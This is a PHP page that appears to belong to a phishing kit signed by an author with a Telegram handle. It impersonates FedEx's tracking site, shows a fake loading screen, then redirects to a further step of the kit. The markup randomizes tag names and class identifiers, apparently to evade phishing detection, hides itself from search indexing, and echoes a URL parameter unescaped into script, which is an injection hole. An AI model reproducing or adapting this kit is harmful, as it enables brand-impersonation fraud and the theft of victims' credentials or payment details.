<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once 'app/config.php';
    $semantic1 = semantic();
    $semantic2 = semantic();
    $semantic3 = semantic();
    $semantic4 = semantic();
    $semantic5 = semantic();
    $semantic6 = semantic();
    $semantic7 = semantic();
    $semantic8 = semantic();
    $semantic9 = semantic();
    $semantic10 = semantic();
    $semantic11 = semantic();
    $semantic12 = semantic();
    $semantic13 = semantic();
    $semantic14 = semantic();
    $semantic15 = semantic();
    $semantic16 = semantic();
?>
<!doctype html>
<html style="display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="media/css/helpers.css">
        <link rel="stylesheet" href="media/css/style.css">

        <link rel="icon" type="image/x-icon" href="media/imgs/ff.ico" />

        <title>Detailed Tracking</title>
    </head>

    <body style="display: flex; flex-direction: column; height: 100%;">

        <<?php echo $semantic1; ?> id="<?php echo rr(); ?>header<?php echo rr(); ?>">
            <<?php echo $semantic2; ?> class="container">
                <<?php echo $semantic3; ?> class="<?php echo rr(); ?>logo<?php echo rr(); ?>">
                    <img src="media/imgs/logo.png">
                </<?php echo $semantic3; ?>>
                <<?php echo $semantic3; ?> class="<?php echo rr(); ?>menu<?php echo rr(); ?> flex-grow-1">
                    <ul>
                        <li>Shipping <img src="media/imgs/arrow.png"></li>
                        <li>Tracking <img src="media/imgs/arrow.png"></li>
                        <li>Support <img src="media/imgs/arrow.png"></li>
                        <li>Account <img src="media/imgs/arrow.png"></li>
                    </ul>
                </<?php echo $semantic3; ?>>
                <<?php echo $semantic3; ?> class="<?php echo rr(); ?>login<?php echo rr(); ?>">
                    <p>
                        <span>Sign Up/Log In</span>
                        <img class="d-xl-inline-block d-lg-none d-md-none d-sm-none d-none" src="media/imgs/header-icon1.png">
                        <img class="d-xl-none d-lg-inline-block d-md-none d-sm-none d-none" src="media/imgs/header-icon2.png">
                        <img class="d-xl-inline-none d-lg-none d-md-inline-block d-sm-inline-block d-inline-block" src="media/imgs/header-icon3.png">
                    </p>
                </<?php echo $semantic3; ?>>
            </<?php echo $semantic2; ?>>
        </<?php echo $semantic1; ?>>

        <<?php echo $semantic4; ?> id="<?php echo rr(); ?>main<?php echo rr(); ?>" class="flex-grow-1">
            <<?php echo $semantic5; ?> class="container">
                <<?php echo $semantic6; ?> class="<?php echo rr(); ?>loader<?php echo rr(); ?>">
                    <<?php echo $semantic7; ?> class="spinner-border"></<?php echo $semantic7; ?>>
                    <p>Loading...</p>
                </<?php echo $semantic6; ?>>
            </<?php echo $semantic5; ?>>
        </<?php echo $semantic4; ?>>

        <<?php echo $semantic8; ?> id="<?php echo rr(); ?>footer<?php echo rr(); ?>">
            <<?php echo $semantic9; ?> class="container">
                <<?php echo $semantic10; ?> class="row">
                    <<?php echo $semantic11; ?> class="col-lg-3">
                        <<?php echo $semantic12; ?> class="widget">
                            <h3>OUR COMPANY</h3>
                            <ul>
                                <li>About FedEx</li>
                                <li>Careers</li>
                                <li>International Holiday Schedule</li>
                                <li>Conditions of Carriage</li>
                                <li>Binding Corporate Rules</li>
                            </ul>
                        </<?php echo $semantic12; ?>>
                    </<?php echo $semantic11; ?>>
                    <<?php echo $semantic11; ?> class="col-lg-3">
                        <<?php echo $semantic13; ?> class="<?php echo rr(); ?>widget<?php echo rr(); ?>">
                            <h3>NEW CUSTOMER</h3>
                            <ul>
                                <li>Open an Account</li>
                            </ul>
                        </<?php echo $semantic13; ?>>
                    </<?php echo $semantic11; ?>>
                    <<?php echo $semantic11; ?> class="col-lg-3">
                        <<?php echo $semantic14; ?> class="<?php echo rr(); ?>widget<?php echo rr(); ?>">
                            <h3>MORE FROM FEDEX</h3>
                            <ul>
                                <li>Fuel Surcharges</li>
                                <li>Resources</li>
                                <li>FedEx Locations</li>
                            </ul>
                        </<?php echo $semantic14; ?>>
                    </<?php echo $semantic11; ?>>
                </<?php echo $semantic10; ?>>
                <hr>
                <p>FOLLOW FEDEX <img src="media/imgs/social.png"></p>
            </<?php echo $semantic9; ?>>
        </<?php echo $semantic8; ?>>

        <<?php echo $semantic15; ?> id="<?php echo rr(); ?>copyright<?php echo rr(); ?>">
            <<?php echo $semantic16; ?> class="container">
                <p>&copy; FedEx 1995-<?php echo date('Y'); ?></p>
                <p>Terms of Use <span>|</span> Security and Privacy</p>
            </<?php echo $semantic16; ?>>
        </<?php echo $semantic15; ?>>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="media/js/js.js"></script>

        <script>
            setTimeout(function () {
                <?php
                if( isset($_GET['error']) ) {
                    ?>
                    window.location.href= 'step4.php?error=' + "<?php echo $_GET['error']; ?>" + '&id=' + "<?php echo mt_rand(11111, 99999999); ?>";
                    <?php
                } else {
                    ?>
                    window.location.href= 'step4.php?id=' + "<?php echo mt_rand(11111, 99999999); ?>";
                    <?php
                }
                ?>
            },20000); // 1000 = 1s
        </script>

    </body>

</html>